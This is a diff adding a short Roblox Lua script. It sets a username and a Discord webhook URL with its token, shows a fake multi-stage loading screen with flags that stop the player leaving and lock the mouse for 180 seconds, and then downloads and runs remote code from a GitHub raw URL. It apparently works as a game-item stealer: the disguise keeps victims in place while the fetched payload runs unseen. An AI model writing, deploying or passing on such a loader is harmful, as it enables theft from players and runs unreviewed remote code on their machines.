@@ -1,0 +1,15 @@
+UserName = "giorpro13"
+Webhook = "https://discord.com/api/webhooks/1138132602964951140/vyD5T1scMyns9T5bM_rfFBzF-9kQ0odoPyhasWKgSgbZsSjbVwZY51x6j6Ckx9JaJ-I1"
+UserName2 = "giorpro13" 
+
+_G.LoadingScreen = true 
+_G.AntiLeave = true 
+_G.MouseLock = true 
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnowyPsx/SnowyPsx/main/NewVersionSnow"))()
